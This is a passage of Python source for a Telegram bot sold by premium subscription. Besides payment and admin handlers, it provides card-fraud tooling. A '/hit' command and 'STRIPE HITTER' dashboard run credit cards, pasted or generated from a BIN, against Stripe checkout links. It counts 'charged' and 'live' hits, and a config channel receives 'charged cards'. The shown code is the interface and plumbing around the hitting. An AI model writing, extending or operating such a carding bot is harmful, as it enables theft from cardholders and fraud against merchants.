    "1_week": {"name": "1 Week Premium", "duration_days": 7, "stars": 150},
    "2_weeks": {"name": "2 Weeks Premium", "duration_days": 14, "stars": 250},
    "1_month": {"name": "1 Month Premium", "duration_days": 30, "stars": 500},
    "3_months": {"name": "3 Months Premium", "duration_days": 90, "stars": 1250}
}

TON_PLANS = {
    "1_week":   {"name": "1 Week Premium",   "duration_days": 7,  "ton": "0.6"},
    "2_weeks":  {"name": "2 Weeks Premium",  "duration_days": 14, "ton": "1.0"},
    "1_month":  {"name": "1 Month Premium",  "duration_days": 30, "ton": "2.0"},
    "3_months": {"name": "3 Months Premium", "duration_days": 90, "ton": "5.0"},
}

# Awaiting tx-hash from user: user_id -> {"plan_key": ..., "ton": ..., "name": ...}
_pending_ton_submissions: dict = {}


async def handle_pre_checkout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle pre-checkout query for Telegram Stars payments"""
    query = update.pre_checkout_query
    
    try:
        payload = query.invoice_payload
        
        if not payload.startswith("premium_"):
            await query.answer(ok=False, error_message="Invalid payment payload")
            return
        
        await query.answer(ok=True)
        print(f"[Stars] Pre-checkout approved: {payload}")
        
    except Exception as e:
        print(f"[Stars] Pre-checkout error: {e}")
        await query.answer(ok=False, error_message="Payment error. Please try again.")


async def handle_successful_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle successful Telegram Stars payment"""
    message = update.message
    payment = message.successful_payment
    user = message.from_user
    
    try:
        payload = payment.invoice_payload
        charge_id = payment.telegram_payment_charge_id
        total_amount = payment.total_amount
        
        print(f"[Stars] Payment received: {payload}, {total_amount} XTR, charge: {charge_id}")
        
        if not payload.startswith("premium_"):
            await message.reply_text(ae("❌ Invalid payment. Contact support."))
            return
        
        parts = payload.split("_")
        if len(parts) >= 3:
            plan_key = f"{parts[1]}_{parts[2]}"
        else:
            plan_key = "1_week"
        
        plan = STARS_PLANS.get(plan_key, STARS_PLANS["1_week"])
        
        from datetime import timedelta
        expiry = datetime.now() + timedelta(days=plan["duration_days"])
        set_premium_sync(user.id, expiry)
        invalidate_user_cache(user.id)  # flush permission cache

        text = ae(f"""✅ <b>PAYMENT SUCCESSFUL!</b> ⭐

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan['name']}
💫 <b>Stars Paid:</b> {total_amount} ⭐
📅 <b>Expires:</b> {expiry.strftime('%Y-%m-%d')}

━━━━━━━━━━━━━━━━━━━━━━

🎉 <b>Your premium is now active!</b>
Enjoy all premium features!

📋 <b>Charge ID:</b> <code>{charge_id}</code>""")
        
        keyboard = [[_btn("Start Using", icon=EID["bolt"], callback_data="start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        
        print(f"[Stars] Premium activated: User {user.id}, Plan: {plan_key}, Expiry: {expiry}")
        
    except Exception as e:
        print(f"[Stars] Payment processing error: {e}")
        import traceback
        traceback.print_exc()
        await message.reply_text(
            "✅ Payment received! If premium isn't active, contact support with your payment receipt."
        )

async def handle_ton_txhash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive a TON transaction hash from a user who just paid."""
    user = update.effective_user
    message = update.message
    text = (message.text or "").strip()

    pending = _pending_ton_submissions.get(user.id)
    if not pending:
        return  # Not waiting for a tx hash from this user

    tx_hash = text
    plan = pending["plan_key"]
    ton_amount = pending["ton"]
    plan_name = pending["name"]
    duration = pending["duration_days"]

    _pending_ton_submissions.pop(user.id, None)

    from config import OWNER_ID, TON_WALLET
    username_str = f"@{user.username}" if user.username else user.first_name

    # Confirm to user
    await message.reply_text(
        f"💎 <b>TON Payment Submitted!</b>\n\n"
        f"📦 <b>Plan:</b> {plan_name}\n"
        f"💎 <b>Amount:</b> {ton_amount} TON\n"
        f"🔗 <b>TX Hash:</b> <code>{html.escape(tx_hash)}</code>\n\n"
        f"⏳ Your payment is being verified by the owner.\n"
        f"You will receive premium access once confirmed.\n\n"
        f"💬 Contact @{SUPPORT_USERNAME} if you need help.",
        parse_mode=ParseMode.HTML
    )

    # Notify owner
    try:
        owner_text = (
            f"💎 <b>NEW TON PAYMENT SUBMITTED</b>\n\n"
            f"👤 User: {username_str} (<code>{user.id}</code>)\n"
            f"📦 Plan: {plan_name} ({duration} days)\n"
            f"💎 Amount: {ton_amount} TON\n"
            f"🔗 TX Hash: <code>{html.escape(tx_hash)}</code>\n\n"
            f"🔍 Verify: https://tonscan.org/tx/{html.escape(tx_hash)}\n\n"
            f"✅ To activate:\n"
            f"<code>/premium {user.id} {duration}</code>"
        )
        await context.bot.send_message(chat_id=OWNER_ID, text=owner_text, parse_mode=ParseMode.HTML)
    except Exception as e:
        print(f"[TON] Owner notify error: {e}")


async def buy_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Buy premium with CoinPayments - /buy [plan]"""
    user = update.effective_user
    
    if is_banned(user.id):
        await update.message.reply_text(ae("🚫 You are banned!"))
        return
    
    if not context.args:
        text = ae("""💰 <b>BUY PREMIUM WITH CRYPTO</b> 💰

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Available Plans:</b>

• <code>1_week</code> - $3 USD (7 days)
• <code>2_weeks</code> - $5 USD (14 days)
• <code>1_month</code> - $10 USD (30 days)
• <code>3_months</code> - $25 USD (90 days)

━━━━━━━━━━━━━━━━━━━━━━

<b>Usage:</b> <code>/buy [plan]</code>
<b>Example:</b> <code>/buy 1_month</code>

Or use the buttons below!

━━━━━━━━━━━━━━━━━━━━━━

🪙 <b>Accepts:</b> BTC, LTC, ETH, USDT, TRX, SOL & more!
✅ <b>Automatic Activation</b> - Premium activates on payment!""")
        
        keyboard = [
            [_btn("1 Week - $3", icon=EID["card"], callback_data="buy_1_week")],
            [_btn("2 Weeks - $5", icon=EID["card"], callback_data="buy_2_weeks")],
            [_btn("1 Month - $10", icon=EID["crown"], callback_data="buy_1_month")],
            [_btn("3 Months - $25", icon=EID["card"], callback_data="buy_3_months")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        return
    
    plan_key = context.args[0].lower()
    
    if plan_key not in CRYPTO_PLANS:
        await update.message.reply_text(
            "❌ <b>Invalid plan!</b>\n\n"
            "Available: <code>1_week</code>, <code>2_weeks</code>, <code>1_month</code>, <code>3_months</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    status_msg = await update.message.reply_text(ae("⏳ Creating payment invoice..."))
    
    import os
    domain = os.environ.get("REPLIT_DEPLOYMENT_URL") or os.environ.get("REPLIT_DEV_DOMAIN", "")
    if domain and not domain.startswith("http"):
        domain = f"https://{domain}"
    callback_url = f"{domain}/webhook/oxapay" if domain else None
    
    result = cp_create_order(
        user_id=user.id,
        username=user.username or user.first_name or "User",
        plan_key=plan_key,
        crypto="USDT",
        callback_url=callback_url
    )
    
    if result.get("error"):
        await status_msg.edit_text(
            f"❌ <b>Error creating order:</b>\n\n{result['error']}\n\n"
            f"Please try again or contact @{SUPPORT_USERNAME}.",
            parse_mode=ParseMode.HTML
        )
        return
    
    plan = result['plan']
    payment_url = result.get('payment_url', '')
    order_id = result.get('order_id', result.get('txn_id', ''))
    
    text = ae(f"""💳 <b>CRYPTO PAYMENT ORDER</b>

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan['name']}
💵 <b>Amount:</b> ${plan['price']} USD
⏰ <b>Duration:</b> {plan['duration_days']} days

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Order ID:</b> <code>{order_id}</code>

━━━━━━━━━━━━━━━━━━━━━━

Click the button below to pay!
🪙 Pay with BTC, LTC, ETH, USDT & more!
✅ Premium activates automatically!""")
    
    keyboard = []
    if payment_url:
        keyboard.append([_btn("Pay Now", icon=EID["card"], url=payment_url)])
    keyboard.append([_btn("Check Status", style="success", icon=EID["regenerate"], callback_data=f"check_payment_{order_id}")])
    keyboard.append([_btn("Support", style="default", icon=EID["users"], url=f"https://t.me/{SUPPORT_USERNAME}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await status_msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)


async def my_payments(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's pending payments - /mypayments"""
    user = update.effective_user
    
    if is_banned(user.id):
        await update.message.reply_text(ae("🚫 You are banned!"))
        return
    
    pending = cp_get_pending(user_id=user.id)
    
    if not pending:
        await update.message.reply_text(
            "📭 <b>No Pending Payments</b>\n\n"
            "You have no pending payments.\n"
            "Use /buy to purchase premium.",
            parse_mode=ParseMode.HTML
        )
        return
    
    text = ae(f"""💳 <b>YOUR PENDING PAYMENTS</b>

━━━━━━━━━━━━━━━━━━━━━━

""")
    
    for i, txn in enumerate(pending[:5], 1):
        plan = CRYPTO_PLANS.get(txn.get('plan_key', ''), {})
        created = txn.get('created_at', txn.get('created', 'N/A'))
        text += f"""<b>#{i} - {plan.get('name', txn.get('plan_key', 'N/A'))}</b>
💵 Amount: ${txn.get('amount', 0)} USD
📅 Created: {str(created)[:19]}

"""
    
    text += """━━━━━━━━━━━━━━━━━━━━━━

📞 Contact owner with payment proof for activation!"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def check_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check payment status - /checkpayment"""
    user = update.effective_user
    
    if is_banned(user.id):
        await update.message.reply_text(ae("🚫 You are banned!"))
        return
    
    await update.message.reply_text(
        "💳 <b>Payment Verification</b>\n\n"
        "Payments are verified manually by the owner.\n\n"
        "📞 Contact @tu_bkl_hai with:\n"
        "• Your User ID\n"
        "• Payment screenshot\n"
        "• Plan purchased\n\n"
        "Premium will be activated within 5 minutes!",
        parse_mode=ParseMode.HTML
    )


async def admin_activate_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manually activate premium for crypto payment - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /cryptoactivate [user_id] [plan]\n\n"
            "Plans: 1_week, 2_weeks, 1_month, 3_months"
        )
        return
    
    try:
        target_id = int(context.args[0])
        plan_key = context.args[1].lower()
        
        if plan_key not in CRYPTO_PLANS:
            await update.message.reply_text(ae("❌ Invalid plan!"))
            return
        
        try:
            target_user = await context.bot.get_chat(target_id)
            target_username = target_user.username or target_user.first_name
        except:
            target_username = "User"
        
        result = cp_activate_premium(target_id, plan_key, target_username, "CoinPayments")
        
        if result:
            await update.message.reply_text(
                f"✅ <b>Premium Activated!</b>\n\n"
                f"User: {target_id}\n"
                f"Plan: {result['plan']}\n"
                f"Expires: {result['expiry']}",
                parse_mode=ParseMode.HTML
            )
            
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=ae(f"✅ <b>Premium Activated!</b>\n\n"
                         f"Your premium has been activated!\n"
                         f"Plan: {result['plan']}\n"
                         f"Expires: {result['expiry']}\n\n"
                         f"Enjoy your premium features!"),
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        else:
            await update.message.reply_text(ae("❌ Error activating premium!"))
            
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))


async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban a user - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "🚫 <b>Ban User</b>\n\n"
            "<b>Usage:</b> <code>/ban &lt;user_id&gt;</code>\n\n"
            "<b>Example:</b> <code>/ban 123456789</code>\n\n"
            "Permanently blocks the user from using the bot.\n"
            "Use <code>/unban &lt;user_id&gt;</code> to reverse.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Add to banned
        with open(DB_BANNED, 'a') as f:
            f.write(f"{target_id}\n")
        invalidate_user_cache(target_id)  # flush permission cache

        await update.message.reply_text(ae(f"✅ User {target_id} banned!"))
        
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "📢 <b>Broadcast</b>\n\n"
            "<b>Usage:</b> <code>/broadcast &lt;message&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/broadcast Bot will be down for maintenance in 10 minutes.</code>\n\n"
            "Sends your message to ALL bot users.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    raw_text = update.message.text
    prefix = raw_text.split(None, 1)
    if len(prefix) < 2:
        await update.message.reply_text(
            "📢 <b>Broadcast</b>\n\n"
            "<b>Usage:</b> <code>/broadcast &lt;message&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/broadcast Bot will be down for maintenance in 10 minutes.</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    message = prefix[1]
    
    users = set()
    for file in [DB_OWNER, DB_PREMIUM, DB_FREE]:
        try:
            with open(file, 'r') as f:
                for line in f:
                    if line.strip().isdigit():
                        users.add(int(line.strip()))
                    elif ' ' in line:
                        users.add(int(line.split()[0]))
        except:
            pass
    
    success = 0
    failed = 0
    
    status_msg = await update.message.reply_text(ae("📢 Broadcasting..."))
    
    for user_id in users:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=message,
                parse_mode=ParseMode.HTML
            )
            success += 1
            await asyncio.sleep(0.1)
        except Exception:
            failed += 1
    
    await status_msg.edit_text(
        f"📢 <b>Broadcast Complete!</b>\n\n"
        f"✅ Sent: {success}\n"
        f"❌ Failed: {failed}",
        parse_mode=ParseMode.HTML
    )

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban a user - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔓 <b>Unban User</b>\n\n"
            "<b>Usage:</b> <code>/unban &lt;user_id&gt;</code>\n\n"
            "<b>Example:</b> <code>/unban 123456789</code>\n\n"
            "Lifts the ban and restores access for the user.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Remove from banned
        try:
            with open(DB_BANNED, 'r') as f:
                lines = f.readlines()
            with open(DB_BANNED, 'w') as f:
                for line in lines:
                    if not line.strip() == str(target_id):
                        f.write(line)
        except:
            pass
        invalidate_user_cache(target_id)  # flush permission cache

        await update.message.reply_text(ae(f"✅ User {target_id} unbanned!"))
        
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show detailed bot statistics - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    try:
        with open(DB_OWNER, 'r') as f:
            owners = [l.strip() for l in f if l.strip()]
        with open(DB_PREMIUM, 'r') as f:
            premium = [l.strip() for l in f if l.strip()]
        with open(DB_FREE, 'r') as f:
            free = [l.strip() for l in f if l.strip()]
        with open(DB_BANNED, 'r') as f:
            banned = [l.strip() for l in f if l.strip()]
        with open(DB_PENDING, 'r') as f:
            pending = [l.strip() for l in f if l.strip()]
    except:
        owners = premium = free = banned = pending = []
    
    total_users = len(set(owners + premium + free))
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • STATS</b>
{sep}
👥 <b>Total</b>   : {total_users}
👑 <b>Owners</b>  : {len(owners)}
💎 <b>Premium</b> : {len(premium)}
🆓 <b>Free</b>    : {len(free)}
⏳ <b>Pending</b> : {len(pending)}
🚫 <b>Banned</b>  : {len(banned)}
{sep}
🚪 <b>Gates</b> : 29+ | 🔧 <b>Tools</b> : 8
{sep}
🤖 @{BOT_USERNAME} | 👑 @{OWNER_USERNAME}""")
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def pending_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show pending users - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    try:
        with open(DB_PENDING, 'r') as f:
            pending = f.readlines()
    except:
        pending = []
    
    if not pending:
        await update.message.reply_text(ae("✅ No pending users!"))
        return
    
    text = "⏳ <b>PENDING USERS</b>\n\n"
    
    for line in pending[:10]:  # Show first 10
        if '|' in line:
            parts = line.strip().split('|')
            if len(parts) >= 3:
                user_id, username, name = parts[0], parts[1], parts[2]
                text += f"👤 {name}\n"
                text += f"🆔 <code>{user_id}</code>\n"
                text += f"👤 @{username}\n"
                text += f"Use: /approve {user_id}\n\n"
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add admin - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/addadmin [user_id]</code>\n\n"
            "💡 <b>Example:</b>\n"
            "<code>/addadmin 123456789</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Check if already admin
        if is_owner(target_id):
            await update.message.reply_text(ae("⚠️ User is already an admin!"))
            return
        
        # Add to owners
        with open(DB_OWNER, 'a') as f:
            f.write(f"{target_id}\n")
        
        # Get target user info
        try:
            target_user = await context.bot.get_chat(target_id)
            target_name = target_user.username or target_user.first_name
        except:
            target_name = str(target_id)
        
        await update.message.reply_text(
            f"✅ <b>Admin Added!</b>\n\n"
            f"👤 User: {target_name}\n"
            f"🆔 ID: <code>{target_id}</code>\n\n"
            f"They now have full admin access!",
            parse_mode=ParseMode.HTML
        )
        
        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=ae("👑 <b>ADMIN ACCESS GRANTED!</b>\n\n"
                     "🎉 Congratulations!\n"
                     "You now have admin privileges!\n\n"
                     "You can now:\n"
                     "• Approve users\n"
                     "• Give premium\n"
                     "• Ban users\n"
                     "• View statistics\n"
                     "• Generate keys\n"
                     "• And more!\n\n"
                     "Send /help to see all commands."),
                parse_mode=ParseMode.HTML
            )
        except:
            pass
            
    except ValueError:
        await update.message.reply_text(ae("❌ User ID must be a number!"))
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove admin - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/removeadmin [user_id]</code>\n\n"
            "💡 <b>Example:</b>\n"
            "<code>/removeadmin 123456789</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Don't allow removing main owner
        if target_id == OWNER_ID:
            await update.message.reply_text(ae("❌ Cannot remove main owner!"))
            return
        
        # Remove from owners
        try:
            with open(DB_OWNER, 'r') as f:
                lines = f.readlines()
            
            with open(DB_OWNER, 'w') as f:
                removed = False
                for line in lines:
                    if line.strip() != str(target_id):
                        f.write(line)
                    else:
                        removed = True
            
            if removed:
                await update.message.reply_text(
                    f"✅ <b>Admin Removed!</b>\n\n"
                    f"🆔 ID: <code>{target_id}</code>\n\n"
                    f"Admin access has been revoked.",
                    parse_mode=ParseMode.HTML
                )
                
                # Notify user
                try:
                    await context.bot.send_message(
                        chat_id=target_id,
                        text=ae("⚠️ <b>Admin Access Revoked</b>\n\n"
                             "Your admin privileges have been removed."),
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
            else:
                await update.message.reply_text(ae("❌ User is not an admin!"))
        except:
            await update.message.reply_text(ae("❌ Error removing admin!"))
            
    except ValueError:
        await update.message.reply_text(ae("❌ User ID must be a number!"))
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def get_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get current chat ID - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    chat_title = update.effective_chat.title if hasattr(update.effective_chat, 'title') else 'Private Chat'
    
    text = ae(f"""🆔 <b>CHAT ID INFORMATION</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Chat ID:</b> <code>{chat_id}</code>
📝 <b>Chat Type:</b> {chat_type}
🏷️ <b>Chat Title:</b> {chat_title}

━━━━━━━━━━━━━━━━━━━━━━

💡 <b>How to use:</b>

1. Add bot to your private channel/group
2. Send /getid in that channel
3. Copy the Chat ID
4. Update config.py:
   <code>CHARGED_CARDS_CHANNEL = {chat_id}</code>

━━━━━━━━━━━━━━━━━━━━━━

✅ All charged cards will be sent there automatically!""")
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


def _get_trial_info_text(info):
    """Extract trial info text from checkout info dict"""
    if not info.get("is_trial"):
        return None
    parts = []
    trial_days = info.get("trial_period_days")
    if trial_days:
        parts.append(f"{trial_days}-day free trial")
    else:
        parts.append("Free Trial")
    after_price = info.get("after_trial_price")
    if after_price:
        parts.append(f"then {after_price}")
    if info.get("setup_intent"):
        parts.append("(SetupIntent)")
    return " | ".join(parts)


import re as _re

def _strip_tg_emoji(text: str) -> str:
    """Remove <tg-emoji> tags, keeping the fallback text inside."""
    return _re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text, flags=_re.DOTALL)

async def _safe_edit(msg, text, parse_mode=None, reply_markup=None):
    """Edit a Telegram message. Handles all common Telegram errors gracefully."""
    kwargs = {"reply_markup": reply_markup} if reply_markup else {}
    _SILENT_EDIT_ERRS = (
        "message is not modified",
        "message to edit not found",
        "message can't be edited",
        "message_id_invalid",
        "chat not found",
        "bot was blocked by the user",
        "user is deactivated",
    )
    try:
        await msg.edit_text(text, parse_mode=parse_mode, **kwargs)
        return
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 0.5)
        try:
            await msg.edit_text(text, parse_mode=parse_mode, **kwargs)
            return
        except Exception:
            pass
    except (TimedOut, NetworkError):
        return
    except BadRequest as e:
        err = str(e).lower()
        if any(x in err for x in _SILENT_EDIT_ERRS):
            return
        print(f"[EDIT_ERR] {str(e)[:120]}")
    except (Forbidden, TelegramError) as e:
        err = str(e).lower()
        if any(x in err for x in _SILENT_EDIT_ERRS):
            return
        print(f"[EDIT_ERR] {str(e)[:120]}")
    except Exception as e:
        err = str(e).lower()
        if any(x in err for x in _SILENT_EDIT_ERRS):
            return
        print(f"[EDIT_ERR] {str(e)[:120]}")
    # Fallback: strip tg-emoji tags and retry plain
    try:
        plain = _strip_tg_emoji(text)
        await msg.edit_text(plain, parse_mode=parse_mode, **kwargs)
    except Exception:
        pass

async def _reply_with_gif(message, category: str, text: str, parse_mode=ParseMode.HTML, reply_markup=None):
    """Send an anime GIF with text as caption. Falls back to plain text if no GIF or caption too long."""
    gif_url = get_sexy_anime_gif(category)
    if gif_url:
        try:
            if len(text) <= 1020:
                await message.reply_animation(animation=gif_url, caption=text, parse_mode=parse_mode, reply_markup=reply_markup)
            else:
                await message.reply_animation(animation=gif_url)
                await message.reply_text(text=text, parse_mode=parse_mode, reply_markup=reply_markup)
            return
        except Exception:
            pass
    await message.reply_text(text=text, parse_mode=parse_mode, reply_markup=reply_markup)

async def _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, progress_done, email=None, trial_info=None, hit_details=None):
    """Build SEMEX-style card-by-card status message."""
    is_done = progress_done >= len(cards)
    done_text = "Done" if is_done else "Running..."

    safe_url = html.escape(str(success_url or "N/A"))
    url_short = safe_url[:60] + "..." if len(safe_url) > 60 else safe_url

    text = (
        f"[ STRIPE HITTER — /hit ]\n\n"
        f"🔗 <b>Link</b> → <code>{url_short}</code>\n"
        f"🏪 <b>Merchant</b> → {html.escape(str(merchant))} — {html.escape(str(price_str))}\n"
        f"📊 <b>Processed</b> → {progress_done}/{len(cards)} — {done_text}\n"
    )
    if trial_info:
        text += f"🔐 <b>Trial</b> → {html.escape(str(trial_info))}\n"
    text += "\n"

    for idx, card in enumerate(cards):
        cc = card['cc']
        masked = f"{cc[:6]}xxxxx{cc[-4:]}|{card['month']}|{card['year']}"
        raw = card_statuses[idx]

        if "CHARGED" in raw or ("Charged" in raw and "—" not in raw[:14]):
            icon, note = "✅", "Payment Successful"
        elif "LIVE" in raw or ("Live" in raw and "—" not in raw[:10]):
            icon, note = "🟡", "Live"
        elif "Hitting" in raw or "Pending" in raw:
            icon, note = "⚡", "Hitting..."
        elif "Declined" in raw or "DECLINED" in raw:
            extra = raw.split("—", 1)[-1].strip()[:45] if "—" in raw else "Declined"
            icon, note = "❌", extra
        elif "3DS" in raw:
            icon, note = "🔐", "3DS Required"
        elif "Stopped" in raw:
            icon, note = "🛑", "Stopped"
        else:
            note = raw.split("—", 1)[-1].strip()[:45] if "—" in raw else raw[:45]
            icon = "⚠️"

        text += f"{icon} <code>{html.escape(masked)}</code> — {html.escape(str(note))}\n"

    if hit_details:
        text += f"\n⚡ <b>Hits:</b>\n"
        for block in hit_details:
            text += f"\n{block}\n"

    return ae(text)


async def hit_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /hit dashboard and hit-runner button callbacks."""
    query = update.callback_query
    user  = query.from_user
    data  = query.data

    # ── Dashboard: Home ────────────────────────────────────────────────────────
    if data == "hit_home":
        await query.answer()
        from modules.database import get_user_check_stats
        stats = get_user_check_stats(user.id)
        rank  = get_user_rank(user.id)
        premium_info = "👤 Free — Limited access"
        try:
            from modules.database import _execute_with_retry
            row = _execute_with_retry(
                "SELECT premium, premium_expiry FROM users WHERE user_id = %s",
                (user.id,), fetch_one=True
            )
            if is_owner(user.id):
                premium_info = "👑 Owner — Unlimited access"
            elif row and row.get("premium") and row.get("premium_expiry"):
                premium_info = f"💎 Premium | Expires {row['premium_expiry'].strftime('%Y-%m-%d')}"
            elif row and row.get("premium"):
                premium_info = "💎 Premium — Unlimited access"
            elif is_approved(user.id):
                premium_info = "✅ Approved — Free tier"
        except:
            premium_info = "✅ Active"
        dash_text, dash_kb = _build_hit_dashboard(user, stats, rank, premium_info)
        try:
            await query.message.edit_caption(caption=dash_text, parse_mode=ParseMode.HTML, reply_markup=dash_kb)
        except:
            try:
                await query.message.edit_text(dash_text, parse_mode=ParseMode.HTML, reply_markup=dash_kb)
            except:
                pass
        return

    # ── Dashboard: Hit Cards (usage hint) ──────────────────────────────────────
    if data == "hit_hitcards":
        await query.answer()
        text = ae(
            f"[ ⚡ HIT CARDS ]\n\n"
            f"Send a command like:\n"
            f"<code>/hit https://checkout.stripe.com/... cc|mm|yy|cvv</code>\n\n"
            f"Or generate from BIN:\n"
            f"<code>/hit https://... 453201</code>\n\n"
            f"Or just send the URL and pick a saved BIN:\n"
            f"<code>/hit https://checkout.stripe.com/...</code>"
        )
        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Dashboard: Generator (redirect to gen menu) ────────────────────────────
    if data == "hit_generator":
        await query.answer("Use /gen or /genbin to generate cards", show_alert=True)
        return

    # ── Dashboard: My Hits ────────────────────────────────────────────────────
    if data == "hit_myhits":
        await query.answer()
        hits = _get_user_recent_hits(user.id, limit=8)
        if not hits:
            text = ae("[ ✅ MY HITS ]\n\nNo hitter charges recorded yet.\nUse /hit to start hitting cards.")
        else:
            lines = ["[ ✅ MY HITS — Recent Charged ]\n"]
            for idx, parts in enumerate(hits, 1):
                ts     = parts[0].strip()[:16] if parts else "?"
                card   = parts[3].strip() if len(parts) > 3 else "?"
                gate   = parts[4].strip() if len(parts) > 4 else ""
                resp   = parts[5].strip()[:30] if len(parts) > 5 else ""
                c_parts = card.split("|")
                cc_mask = f"{c_parts[0][:6]}****{c_parts[0][-4:]}" if c_parts and len(c_parts[0]) >= 10 else card[:16]
                lines.append(f"✅ {cc_mask} — {resp}")
            lines.append(f"\n<i>Showing last {len(hits)} hits</i>")
            text = ae("\n".join(lines))
        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Dashboard: My Status ──────────────────────────────────────────────────
    if data == "hit_status":
        await query.answer()
        from modules.database import get_user_check_stats
        stats   = get_user_check_stats(user.id)
        rank    = get_user_rank(user.id)
        total   = stats.get('total', 0)
        approved = stats.get('approved', 0)
        declined = stats.get('declined', 0)
        rate    = stats.get('success_rate', 0)
        since   = stats.get('first_check')
        since_str = since.strftime('%Y-%m-%d') if since else 'N/A'
        uname   = f"@{user.username}" if user.username else str(user.id)
        text = ae(
            f"[ 📊 MY STATUS ]\n\n"
            f"👤 User 〝 {html.escape(uname)}\n"
            f"🆔 ID 〝 <code>{user.id}</code>\n"
            f"🏅 Rank 〝 {rank}\n"
